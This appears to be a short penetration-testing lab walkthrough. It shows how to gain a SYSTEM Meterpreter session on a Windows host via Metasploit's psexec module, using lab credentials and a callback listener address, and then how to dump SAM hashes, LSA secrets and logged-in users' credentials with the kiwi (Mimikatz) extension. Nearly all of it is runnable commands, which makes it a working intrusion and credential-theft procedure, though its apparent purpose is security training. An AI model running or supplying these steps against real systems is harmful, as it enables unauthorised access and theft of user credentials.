# Mimikatz Demonstration

## Step 1: Open a Meterpreter Session as SYSTEM on WIN10

If you don't have a Meterpreter SYSTEM session open, follow these steps:

### Load the `psexec` Module
```bash
use exploit/windows/smb/psexec
```

### Set the Following Parameters:
```bash
set RHOSTS 172.22.117.20
set SMBUSER tstark
set SMBPass Password!
set SMBDomain megacorpone
set LHOST 172.22.117.100
```

### Run the Module
```bash
run
```

> Even though we set the credentials to `tstark`, the PSExec module in Metasploit will always open a session as SYSTEM due to how it executes the payload via service creation.

---

## Step 2: Load the `kiwi` (Mimikatz) Module

Once inside the Meterpreter session:

```bash
load kiwi
```

Metasploit and Meterpreter both support loading add-ons like `kiwi`. When loaded, the help menu updates with commands from the new module.

To list all available kiwi commands:
```bash
?
```

---

## Step 3: Dump Credentials

### Dump SAM Credentials
```bash
lsa_dump_sam
```

> Focus on the `User` and `Hash NTLM` fields. These contain NTLM hashes for each user.

---

### Use `creds_all` to Collect All Available Credentials
```bash
creds_all
```

> If no results are returned, you may need to **migrate to a 64-bit SYSTEM process**.

`creds_all` scans several locations for credentials, often from **currently logged-in users**. For example, you might see `pparker`'s credentials if they're logged in.

Note: `SAM` contents are not included in `creds_all`.

---

### Dump Cached Credentials using `kiwi_cmd`

The `creds_all` command doesn't retrieve cached credentials, but you can use raw Mimikatz commands:

```bash
kiwi_cmd lsadump::sam
```

> This command provides output similar to `lsa_dump_sam` and is useful when dumping cached credentials.

---

## Additional References

- [Mimikatz Cheat Sheet](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Mimikatz.ps1)
- [Mimikatz Commands Documentation](https://adsecurity.org/?page_id=1821)

